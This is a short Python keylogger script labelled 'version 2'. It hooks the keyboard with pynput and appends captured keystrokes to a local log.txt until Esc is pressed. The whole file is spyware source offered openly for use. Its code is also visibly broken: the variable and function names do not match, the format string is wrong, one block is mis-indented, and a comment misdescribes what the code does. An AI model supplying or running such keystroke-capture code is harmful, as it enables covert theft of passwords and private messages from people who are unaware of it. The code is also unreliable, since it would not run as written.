#version 2 keylogger

from pynput.keyboard import Key, Listener

	
count     = 0
keys_list = []

def key_press(key):
	global keys,count
	#adds the key button that was pressed to the keys list 
	keys.append(key)
	count += 1
	#debugging
	print("{o} pressed".format(key))
	
#write them into the file if count reaches 5
	if count >= 5:
		count = 0
		write_file(keys)
		keys = []

def write_to_file(keys):
#if run for the first time use "w" to create the file then afterwards you have to use "a"
	with open("log.txt", "a") as f:
	for key in keys:
#removes the quotations marks 
		k = str(key).replace(",", "")
		if k.find("space") >0:
			#returns a string
			f.write(str(key))
#if it doesn't find the string that we are looking for returns a -1 value
#if key does not exist then we just write that into the file
		elif k.find("Key") == -1:
			f.write(k)
			
		

#if esc is pressed we return false and breaks out of the loop thus it stops the program
def key_release(key):
	if key == Key.esc:
		return False


#constantly keeps running this loop until we break it
with Listener(on_press = key_press, on_release = key_release) as listener:
	listener.join()